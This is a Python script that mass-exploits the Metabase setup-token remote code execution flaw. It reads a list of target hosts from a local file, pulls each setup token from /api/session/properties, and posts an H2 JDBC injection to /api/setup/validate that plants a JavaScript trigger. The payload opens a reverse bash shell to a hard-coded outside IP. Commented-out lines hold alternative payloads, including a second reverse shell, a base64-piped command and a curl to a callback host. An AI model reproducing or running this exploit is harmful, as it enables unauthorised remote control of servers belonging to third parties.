import requests,threading,os,urllib3,json,base64
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#fofa: 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'


def exploit(ip_, index):
    try:
        # cmd='whoami'
        # cmd='echo -n "bash -i >&/dev/tcp/13.231.45.178/3333 0>&1" | base64'
        cmd='bash -c "bash -i >& /dev/tcp/39.101.76.53/3333 0>&1"'
        # cmd = base64.b64encode(cmd.encode()).decode()
        # print(cmd)
        url = ip_+'/api/session/properties'
        # print(index,url)
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        data=res.json()
        setup_token=data.get('setup-token')
        if res.status_code!=200 or setup_token==None:
            return
        print(setup_token)

        post_url=ip_+'/api/setup/validate'
        payload={
            "token": setup_token,
            "details": {
                "is_on_demand": False,
                "is_full_sync": False,
                "is_sample": False,
                "cache_ttl": None,
                "refingerprint": False,
                "auto_run_queries": True,
                "schedules": {},
                "details": {
                    # "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(\'bash -c {echo,%s}|{base64,-d}|{bash,-i}\')\n$$--=x"
                    # % cmd,
                    #  "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl yy2fqifc.eyes.sh')\n$$--=x",
                     "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -i >& /dev/tcp/39.101.76.53/3333 0>&1')\n$$--=x",

                    "advanced-options": False,
                    "ssl": True,
                },
                "name": "an-sec-research-team",
                "engine": "h2",
            },
        },
        # payload=json.dumps(payload)
        post_res=requests.post(post_url,json=payload, timeout=8, verify=False)
        # print(res, len(res.text))

        print(post_res,len(post_res.text))
        # print(post_res.text)
        print(index,ip_)
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\metabase.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 100
        end = start+100

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 15
# print(urls)

test = 'm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()